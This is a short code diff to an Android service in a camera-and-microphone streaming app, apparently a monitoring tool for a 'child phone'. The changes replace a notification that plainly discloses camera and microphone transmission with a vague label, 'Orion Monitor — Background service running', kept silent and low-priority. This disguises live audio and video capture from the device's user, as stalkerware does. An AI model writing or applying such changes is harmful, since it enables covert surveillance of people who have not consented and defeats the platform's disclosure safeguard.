@@ -233,8 +233,8 @@ public class SenderService extends Service {
                 PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
         return new Notification.Builder(this, "argus_sender")
                 .setSmallIcon(android.R.drawable.ic_menu_camera)
-                .setContentTitle("ARGUS — Child phone")
-                .setContentText(text)
+                .setContentTitle("Orion Monitor")
+                .setContentText("Background service running")
                 .setCategory(Notification.CATEGORY_SERVICE)
                 .setPriority(Notification.PRIORITY_LOW)
                 .setSilent(true)
@@ -249,8 +249,8 @@ public class SenderService extends Service {
 
     private void createChannel() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        NotificationChannel c = new NotificationChannel("argus_sender", "ARGUS camera and microphone", NotificationManager.IMPORTANCE_LOW);
-        c.setDescription("Required while ARGUS is transmitting camera and microphone");
+        NotificationChannel c = new NotificationChannel("argus_sender", "Orion Monitor background service", NotificationManager.IMPORTANCE_LOW);
+        c.setDescription("Background service while monitoring is active");
         c.setSound(null, null);
         c.enableVibration(false);
         c.setShowBadge(false);
